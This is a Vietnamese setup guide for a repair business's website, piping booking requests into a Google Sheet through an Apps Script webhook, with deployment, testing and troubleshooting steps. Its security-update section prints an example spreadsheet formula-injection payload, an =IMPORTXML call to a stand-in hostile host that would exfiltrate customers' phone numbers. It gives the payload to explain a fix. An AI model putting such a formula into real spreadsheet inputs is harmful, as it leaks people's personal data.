# Hướng dẫn kết nối Google Sheet

Làm một lần, khoảng **5–7 phút**. Sau khi xong, mọi yêu cầu đặt lịch từ website sẽ tự chảy
vào bảng tính của bạn, kèm email thông báo có sẵn nút bấm gọi.

> Bảng tính nằm trong Google Drive của bạn. Bên phát triển **không** có quyền xem dữ liệu khách hàng.

---

## Bước 1 — Tạo bảng tính

1. Mở [sheets.new](https://sheets.new) (tự tạo một bảng tính trống).
2. Đặt tên ở góc trên bên trái: **Đặt lịch — Điện Lạnh Thái Tuấn**

## Bước 2 — Mở trình soạn mã

Trên thanh menu chọn **Tiện ích mở rộng → Apps Script**.
(Nếu Google đang để tiếng Anh: **Extensions → Apps Script**.)

Một tab mới mở ra, có sẵn vài dòng `function myFunction() {}`.

## Bước 3 — Dán mã

1. **Xoá sạch** nội dung có sẵn trong ô soạn thảo.
2. Mở file **`scripts/apps-script.gs`** trong dự án, copy **toàn bộ**, dán vào.
3. **Bấm biểu tượng đĩa mềm 💾 để lưu** (hoặc `Ctrl+S`).

> ⚠️ **Bắt buộc lưu trước khi làm bước sau.** Khi chưa lưu, phía trên hiện dòng
> *"Nội dung thay đổi chưa lưu"* và ô chọn hàm vẫn là *"Không có hàm nào"* —
> lưu xong danh sách hàm mới hiện ra.

> ⚠️ Mở `.env.local`, copy giá trị `GOOGLE_SHEET_SECRET` và dán vào dòng
> `const SECRET = 'DAN_CHUOI_BI_MAT_VAO_DAY';` ở đầu file **trước khi** dán sang Apps Script.
> Chuỗi này cố ý không lưu trong `scripts/apps-script.gs` để không bị lộ khi đẩy code lên GitHub.

## Bước 4 — Chạy thiết lập ban đầu

1. Ở thanh công cụ phía trên, chỗ ô chọn hàm (đang ghi *"Không có hàm nào"*),
   bấm vào và chọn **`thietLapBanDau`**.
2. Bấm **▷ Chạy** (*Run*).
3. Google sẽ hỏi quyền lần đầu:
   - **Xem lại quyền** (*Review permissions*) → chọn tài khoản Google của bạn
   - Màn hình *"Google chưa xác minh ứng dụng này"* → **Nâng cao** (*Advanced*)
     → **Chuyển đến … (không an toàn)** (*Go to … unsafe*)
   - Bấm **Cho phép** (*Allow*)

   > Cảnh báo này là bình thường: Google hiện nó cho mọi Apps Script tự viết chưa qua thẩm định.
   > Mã chỉ ghi vào chính bảng tính của bạn và gửi email cho bạn.

4. Chạy xong sẽ hiện thông báo *"Đã thiết lập xong tab Leads"*.
   Quay lại bảng tính sẽ thấy tab **Leads** với tiêu đề nền xanh, cột Trạng thái có ô chọn màu.

## Bước 5 — Xuất bản (Deploy)

1. Góc trên bên phải bấm **Deploy → New deployment**.
2. Bấm biểu tượng bánh răng ⚙ cạnh "Select type" → chọn **Web app**.
3. Điền:
   - **Description**: `Nhan dat lich tu website`
   - **Execute as**: **Me** *(chính bạn)*
   - **Who has access**: **Anyone** ⚠️ **bắt buộc chọn đúng mục này**
4. Bấm **Deploy**.
5. Copy dòng **Web app URL** — dạng
   `https://script.google.com/macros/s/AKfy…/exec`

> **"Anyone" có nguy hiểm không?** Không. Nó chỉ cho phép website gửi dữ liệu **vào**.
> Ai không có chuỗi bí mật thì bị từ chối ngay. Không ai đọc được dữ liệu trong bảng tính qua link này.

## Bước 6 — Dán URL vào website

Mở file **`.env.local`** ở thư mục gốc dự án, dán URL vừa copy vào sau dấu `=`:

```
GOOGLE_SHEET_WEBHOOK_URL=https://script.google.com/macros/s/AKfy…/exec
GOOGLE_SHEET_SECRET=<chuỗi bí mật của bạn>
```

## Bước 7 — Kiểm tra

```bash
node scripts/test-sheet-webhook.mjs
```

Kết quả mong đợi:

```
  ✓ Buoc 1/3 — Web App dang chay
  ✓ Buoc 2/3 — khoa bi mat dang duoc kiem tra dung
  ✓ Buoc 3/3 — da ghi duoc mot dong vao Sheet
```

Mở bảng tính sẽ thấy một dòng **"KIEM TRA HE THONG"** và một email thông báo trong hộp thư.
Xoá dòng đó đi là xong.

---

## Bảng tính trông như thế nào

| Cột | Nội dung | Ai điền |
|---|---|---|
| A | Thời gian | Tự động |
| B | Họ tên | Khách |
| C | Số điện thoại | Khách (giữ nguyên số 0 đầu) |
| D | Dịch vụ | Khách |
| E | Địa chỉ | Khách |
| F | Mô tả tình trạng | Khách |
| G | Nguồn | Tự động — biết khách đến từ đâu |
| H | Thiết bị | Tự động — Mobile / Desktop |
| **I** | **Trạng thái** | **Bạn tự cập nhật**: Mới → Đã gọi → Đã đặt lịch → Hoàn thành / Huỷ |
| **J** | **Ghi chú nội bộ** | **Bạn tự ghi** |

Cột Trạng thái có sẵn ô chọn và tự đổi màu, tiện theo dõi từng khách.

---

## Gặp trục trặc

| Hiện tượng | Nguyên nhân & cách xử lý |
|---|---|
| Script báo *"Google tra ve trang dang nhap"* | Chưa đặt **Ai có quyền truy cập: Bất kỳ ai**. Vào **Triển khai → Quản lý các lần triển khai → ✏️** sửa lại rồi **Triển khai**. |
| Ô chọn hàm vẫn ghi *"Không có hàm nào"* | Chưa lưu. Bấm 💾 hoặc `Ctrl+S`. |
| Báo *"Apps Script KHONG chan khoa sai"* | Biến `SECRET` trong Apps Script không khớp `.env.local`. Đối chiếu lại hai bên. |
| Có dòng trong Sheet nhưng không có email | Lần đầu Google có thể chưa cấp quyền gửi mail. Chạy lại hàm `thietLapBanDau` và bấm Allow đầy đủ. |
| Số điện thoại mất số 0 đầu | Cột C phải ở định dạng văn bản. Chạy lại `thietLapBanDau` là tự sửa. |
| **Sửa mã xong không thấy thay đổi** | Apps Script vẫn chạy bản cũ. Phải vào **Triển khai → Quản lý các lần triển khai → ✏️ → Phiên bản: Phiên bản mới → Triển khai**. |

---

## ⚠️ Nếu bạn đã cài đặt từ trước — phải dán lại mã

Bản `scripts/apps-script.gs` mới đã vá một lỗ bảo mật thật: trước đây nếu khách
điền họ tên là một công thức, ví dụ

```
=IMPORTXML("https://trang-xau.com/?x="&C2&C3,"//a")
```

thì Google Sheets sẽ **tự chạy công thức đó** ngay khi bạn mở bảng tính, và gửi
số điện thoại của những khách hàng khác sang máy chủ của kẻ tấn công.

Bản mới chèn dấu nháy đơn phía trước các ô như vậy nên Sheets hiểu đó chỉ là chữ.
Dấu nháy này không hiện ra khi xem nên bảng tính trông vẫn y như cũ.

Cách cập nhật (mất khoảng 2 phút):

1. Mở lại bảng tính → **Tiện ích mở rộng → Apps Script**
2. Xoá sạch nội dung cũ, dán lại **toàn bộ** `scripts/apps-script.gs`
3. Điền lại `SECRET` bằng đúng giá trị `GOOGLE_SHEET_SECRET` trong `.env.local`
4. Bấm **Triển khai → Quản lý các lần triển khai** → biểu tượng bút chì →
   Phiên bản chọn **Phiên bản mới** → **Triển khai**

URL webhook **không đổi**, nên không phải sửa gì trong `.env.local`.
Không cần chạy lại `thietLapBanDau()`.

---

## Sau này muốn đổi email nhận thông báo

Mở Apps Script, sửa dòng:

```javascript
const NOTIFY_EMAIL = 'nguyenlethaituan10122002@gmail.com';
```

Lưu, rồi **Triển khai → Quản lý các lần triển khai → Phiên bản mới**
(bắt buộc, nếu không Google sẽ vẫn chạy bản cũ).
